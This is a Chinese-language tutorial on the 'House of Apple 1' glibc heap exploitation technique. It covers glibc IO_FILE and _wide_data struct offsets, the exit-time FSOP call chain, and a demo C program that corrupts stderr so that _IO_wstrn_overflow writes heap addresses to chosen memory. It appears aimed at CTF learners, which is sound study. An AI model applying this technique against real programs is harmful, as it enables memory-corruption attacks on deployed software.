# House of Apple1


## 0xff 背景

> 同样是为了应对glibc2.34及以后的无hook时代

在无hook时代，`house of pig`、`house of kiwi`、`house of emma`中关于IO\_FILE结构体的伪造和IO流的攻击都给出了新的思路。但，

- `house of pig`除了需要劫持IO\_FILE结构体，还需要劫持`tcache_perthread_strcut`结构体或者可以控制任意地址分配
- `house of kiwi`则至少需要修改\*\*三个\*\*地方的值，`_IO_helper_jumps+0xA0`、`_IO_helper_jumps+0xA8`、`_IO_file_jumps+0x60`处的`_IO_file_sync`指针
- `house of emma`则至少需要修改\*\*两个\*\*地方的值，`tls`结构体中的`point_guard`，伪造一个IO\_FILE或替换vatable为`xxx_cookie_jumps`的地址

这就导致如果想要使用这些攻击方式，至少需要\*\*两次写\*\*或者\*\*一次写和一次任意地址读\*\*。但在仅一次任意地址写的时候很难利用了

而`house of apple`便是在仅使用一次`largebin attack`并限制读写次数的条件下进行\*\*FSOP\*\*利用


## 0x00 利用条件

1. 程序从`main`返回或能调用`exit`函数
2. 可以泄露出来`heap`地址和`libc`地址
3. 能够使用一个`largebin attack`


## 0x01 原理


### 综述

当程序从`main`返回或者执行`exit`函数的时候，均会调用`fcloseall`函数，调用链如下：


```

exit


└───►
fcloseall


└───►
_IO_cleanup


└───►
_IO_flush_all_lockp


└───►
_IO_OVERFLOW

```

最后会遍历`_IO_list_all`存放的每一个`IO_FILE`结构体，如果满足条件，就会调用每个结构体中的`vatble->_overflow`函数指针指向的函数

使用`larginbin attack`可以劫持`_IO_list_all`变量，将其替换为伪造的`IO_FILE`结构体，而在此时，我们可以继续利用某些`IO`流函数去修改其它地方的值


```

struct

_IO_FILE_complete

{


struct

_IO_FILE

_file
;


__off64_t

_offset
;


/* Wide character stream stuff.  */


struct

_IO_codecvt

*
_codecvt
;


struct

_IO_wide_data

*
_wide_data
;

// 劫持此变量


struct

_IO_FILE

*
_freeres_list
;


void

*
_freeres_buf
;


size_t

__pad5
;


int

_mode
;


/* Make sure we don't get into trouble again.  */


char

_unused2
[
15

*

sizeof

(
int
)

-

4

*

sizeof

(
void

*
)

-

sizeof

(
size_t
)];

};

```

*`struct _IO_wide_data *_wide_data`在`_IO_FILE`中的偏移为`0xa0`*

那么通过伪造`_wide_data`变量，然后通过某些函数，然后通过如`_IO_wstrn_overflow`就可以将已知地址空间上的某些值修改


```

static

wint_t

_IO_wstrn_overflow

(
FILE

*
fp
,

wint_t

c
)

{


/* When we come to here this means the user supplied buffer is

     filled.  But since we must return the number of characters which

     would have been written in total we must provide a buffer for

     further use.  We can do this by writing on and on in the overflow

     buffer in the _IO_wstrnfile structure.  */


_IO_wstrnfile

*
snf

=

(
_IO_wstrnfile

*
)

fp
;


if

(
fp
->
_wide_data
->
_IO_buf_base

!=

snf
->
overflow_buf
)


{


_IO_wsetb

(
fp
,

snf
->
overflow_buf
,


snf
->
overflow_buf

+

(
sizeof

(
snf
->
overflow_buf
)


/

sizeof

(
wchar_t
)),

0
);


fp
->
_wide_data
->
_IO_write_base

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_read_base

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_read_ptr

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_read_end

=

(
snf
->
overflow_buf


+

(
sizeof

(
snf
->
overflow_buf
)


/

sizeof

(
wchar_t
)));


}


fp
->
_wide_data
->
_IO_write_ptr

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_write_end

=

snf
->
overflow_buf
;


/* Since we are not really interested in storing the characters

     which do not fit in the buffer we simply ignore it.  */


return

c
;

}

```


```

flowchart LR

A[调用 _IO_wstrn_overflow] --> B{缓冲区已满}
B -->|是| C{当前缓冲是否为 overflow_buf?}
B -->|否| Z[返回 c]

C -->|否| D[切换缓冲区到 snf->overflow_buf<br/>更新 read/write 指针]
C -->|是| E[保持 overflow_buf]

D --> E
E --> F[设置 write_ptr == write_end<br/> → 写窗口为 0]
F --> G[忽略实际写入]
G --> Z[返回 c]

```

此函数将`fp`强转伟`_IO_wstrnfile *`指针，然后判断`fp->_wide_data->_IO_buf_base!=snf->overflow_buf`是否成立；

如果成立，则会对`fp->_wide_data`的`_IO_write_base`、`_IO_read_base`、`_IO_read_ptr`和`_IO_read_end`赋值为`snf->overflow_buf`或者与该地址一定范围内偏移的值；

最后对`fp->_wide_data`和`_IO_write_ptr`和`_IO_write_end`赋值

**总结来说**，只要控制了`fp->_wide_data`，就可以控制`fp->_wide_data`开始一定范围内的内存值，也就是等同于\*\*任意地址写已知地址\*\*


### 操作

`_IO_wstrnfile`涉及到的结构体如下


```

struct

_IO_str_fields

{


_IO_alloc_type

_allocate_buffer_unused
;


_IO_free_type

_free_buffer_unused
;

};

struct

_IO_streambuf

{


FILE

_f
;


const

struct

_IO_jump_t

*
vtable
;

};

typedef

struct

_IO_strfile_

{


struct

_IO_streambuf

_sbf
;


struct

_IO_str_fields

_s
;

}

_IO_strfile
;

typedef

struct

{


_IO_strfile

f
;


/* This is used for the characters which do not fit in the buffer

     provided by the user.  */


char

overflow_buf
[
64
];

}

_IO_strnfile
;

typedef

struct

{


_IO_strfile

f
;


/* This is used for the characters which do not fit in the buffer

     provided by the user.  */


wchar_t

overflow_buf
[
64
];

// overflow_buf在这里

}

_IO_wstrnfile
;

```

其中，`overflow_buf[64]`相对于`_IO_FILE`结构体的偏移为`0xf0`，在`vtable`后面

`struct _IO_wide_data`结构体如下:


```

struct

_IO_wide_data

{


wchar_t

*
_IO_read_ptr
;

/* Current read pointer */


wchar_t

*
_IO_read_end
;

/* End of get area. */


wchar_t

*
_IO_read_base
;

/* Start of putback+get area. */


wchar_t

*
_IO_write_base
;

/* Start of put area. */


wchar_t

*
_IO_write_ptr
;

/* Current put pointer. */


wchar_t

*
_IO_write_end
;

/* End of put area. */


wchar_t

*
_IO_buf_base
;

/* Start of reserve area. */


wchar_t

*
_IO_buf_end
;

/* End of reserve area. */


/* The following fields are used to support backing up and undo. */


wchar_t

*
_IO_save_base
;

/* Pointer to start of non-current get area. */


wchar_t

*
_IO_backup_base
;

/* Pointer to first valid character of

                   backup area */


wchar_t

*
_IO_save_end
;

/* Pointer to end of non-current get area. */


__mbstate_t

_IO_state
;


__mbstate_t

_IO_last_state
;


struct

_IO_codecvt

_codecvt
;


wchar_t

_shortbuf
[
1
];


const

struct

_IO_jump_t

*
_wide_vtable
;

};

```

**总而言之**，如果在堆上伪造一个`_IO_FILE`结构体并已知其为地址`A`，将`A+0xd8`替换为`_IO_wstrn_jumps`地址，将`A+0xc0`设置为`B`，并设置其它成员以便能调用到`_IO_overflow`.`exit`函数则会一路调用到`` `_IO_wstrn_overflow ``函数，并将`B`至`B+0x38`的地址区域的内容都替换为`A+0xf0`或者`A+0x1f0`

---

好的，以上基本都是提出`house of apple`的大师傅的说法，这边长话短说，做一个梳理.

以下为`struct _IO_FILE`结构体内部各结构体的偏移（amd64）：


```

0x0
:
'
_flags
'
,

0x8
:
'
_IO_read_ptr
'
,

0x10
:
'
_IO_read_end
'
,

0x18
:
'
_IO_read_base
'
,

0x20
:
'
_IO_write_base
'
,

0x28
:
'
_IO_write_ptr
'
,

0x30
:
'
_IO_write_end
'
,

0x38
:
'
_IO_buf_base
'
,

0x40
:
'
_IO_buf_end
'
,

0x48
:
'
_IO_save_base
'
,

0x50
:
'
_IO_backup_base
'
,

0x58
:
'
_IO_save_end
'
,

0x60
:
'
_markers
'
,

0x68
:
'
_chain
'
,

0x70
:
'
_fileno
'
,

0x74
:
'
_flags2
'
,

0x78
:
'
_old_offset
'
,

0x80
:
'
_cur_column
'
,

0x82
:
'
_vtable_offset
'
,

0x83
:
'
_shortbuf
'
,

0x88
:
'
_lock
'
,

0x90
:
'
_offset
'
,

0x98
:
'
_codecvt
'
,

0xa0
:
'
_wide_data
'
,

0xa8
:
'
_freeres_list
'
,

0xb0
:
'
_freeres_buf
'
,

0xb8
:
'
__pad5
'
,

0xc0
:
'
_mode
'
,

0xc4
:
'
_unused2
'
,

0xd8
:
'
vtable
'

```

那么顺序如下：

1. 目前已知某`IO_FILE`结构体的地址为`A`，将`A+0xd8`替换为`_IO_wstrn_jump`<=>将本IO\_FILE结构体的虚表切换为`_IO_wstrn_jump`函数；**从而切换到`_IO_wstrn_ *`系列函数**

可以修改`_IO_wstrn_jumps`结构体中的函数指针指向`_IO_wstrn_overflow`


```

static

wint_t

_IO_wstrn_overflow

(
FILE

*
fp
,

wint_t

c
)

{


_IO_wstrnfile

*
snf

=

(
_IO_wstrnfile

*
)

fp
;


if

(
fp
->
_wide_data
->
_IO_buf_base

!=

snf
->
overflow_buf
)


{


_IO_wsetb

(
fp
,

snf
->
overflow_buf
,


snf
->
overflow_buf

+

(
sizeof

(
snf
->
overflow_buf
)


/

sizeof

(
wchar_t
)),

0
);


fp
->
_wide_data
->
_IO_write_base

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_read_base

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_read_ptr

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_read_end

=

(
snf
->
overflow_buf


+

(
sizeof

(
snf
->
overflow_buf
)


/

sizeof

(
wchar_t
)));


}


fp
->
_wide_data
->
_IO_write_ptr

=

snf
->
overflow_buf
;


fp
->
_wide_data
->
_IO_write_end

=

snf
->
overflow_buf
;


return

c
;

}

```

1. 这段代码中没有关于`fp->_wide_data`的合法检查。也就是如果可以控制`fp->_wide_data`，就可以让`snf->overflow_buf`这个地址写入到`fp->_wide_data->_IO_write_base`上；也即将`snf->overflow_buf`写到了`fp->_wide_data+0x20`处

---


### demo

不同的glibc版本偏移略有不同，可以自行尝试


```

#include
<stdio.h>

#include
<stdlib.h>

#include
<stdint.h>

#include
<unistd.h>

#include
<string.h>

void

init
()

{


setbuf
(
stdout
,

0
);


setbuf
(
stdin
,

0
);


setvbuf
(
stderr
,

0
,

2
,

0
);

}

int

main
()

{


init
();


puts
(
"[+] allocate a 0x100 chunk"
);


size_t

*
p1

=

malloc
(
0xf0
);


size_t

*
tmp

=

p1
;


size_t

old_value

=

0x114514
;


for

(
size_t

i

=

0
;

i

<

0x100

/

8
;

i
++
)

{


p1
[
i
]

=

old_value
;


}


puts
(
"【old value】"
);


for

(
size_t

i

=

0
;

i

<

4
;

i
++
)

{


printf
(
"【-】[%p]: 0x%016lx  0x%016lx
\n
"
,

tmp
,

tmp
[
0
],

tmp
[
1
]);


tmp

+=

2
;


}


puts
(
""
);


size_t

puts_addr

=

(
size_t
)
&
puts
;


printf
(
"【-】 puts address: %p
\n
"
,

(
void

*
)
puts_addr
);


size_t

stderr_write_ptr_addr

=

puts_addr

+

0x1997b8

+

0x10c0
;


printf
(
"【-】 stderr->_IO_write_ptr address: %p
\n
"
,

(
void
*
)
stderr_write_ptr_addr
);


size_t

stderr_flags2_addr

=

puts_addr

+

0x199804

+

0x10c0
;


printf
(
"【-】 stderr->_flags2 address: %p
\n
"
,

(
void

*
)
stderr_flags2_addr
);


size_t

stderr_wide_data_addr

=

puts_addr

+

0x199830

+

0x10c0
;


printf
(
"【-】 stderr->_wide_data address: %p
\n
"
,

(
void

*
)
stderr_wide_data_addr
);


size_t

sdterr_vtable_addr

=

puts_addr

+

0x199868

+

0x10c0
;


printf
(
"【-】 stderr->vtable address: %p
\n
"
,

(
void

*
)
sdterr_vtable_addr
);


size_t

_IO_wstrn_jumps_addr

=

puts_addr

+

0x194f70
;


printf
(
"【-】 _IO_wstrn_jumps address: %p
\n
"
,

(
void

*
)
_IO_wstrn_jumps_addr
);


puts
(
""
);


puts
(
"[+] change stderr->_IO_write_pte to -1"
);


*
(
size_t

*
)
stderr_write_ptr_addr

=

(
size_t
)
-1
;


puts
(
"[+] change stderr->_flags2 to 8"
);


*
(
size_t

*
)
stderr_flags2_addr

=

8
;


puts
(
"[+] replace stderr->_wide_data with the allocated chunk"
);


*
(
size_t

*
)
stderr_wide_data_addr

=

(
size_t
)
p1
;


puts
(
"[+] replace stderr->vtable with _IO_wstrn_jumps"
);


*
(
size_t

*
)
sdterr_vtable_addr

=

(
size_t
)
_IO_wstrn_jumps_addr
;


puts
(
"[+] call fcloseall and trigger house of apple"
);


fcloseall
();


tmp

=

p1
;


puts
(
"【new value】"
);


for

(
size_t

i

=

0
;

i

<

4
;

i
++
)

{


printf
(
"【-】[%p]: 0x%016lx  0x%016lx
\n
"
,

tmp
,

tmp
[
0
],

tmp
[
1
]);


tmp

+=

2
;


}


return

0
;

}

```


## 0x02总结

`house of apple`是一种针对`_wide_data`的攻击手法，本方法通过劫持`_wide_data`成员并在仅一次的`largebin attack`的条件下实现`FSOP`的利用

不过`house of apple1`并不能直接获取`shell`，通常情况下是只能向几个地址里写入一个堆地址。可以用来修改`global_max_fast`全局变量（有点像ub attack）


### 例题分析


## 参考文章

<https://bbs.kanxue.com/thread-273418.htm#msg_header_h1_0>

<https://zikh26.github.io/posts/19609dd.html>

<https://blog.csdn.net/qq_54218833/article/details/128624427?spm=1001.2014.3001.5502>
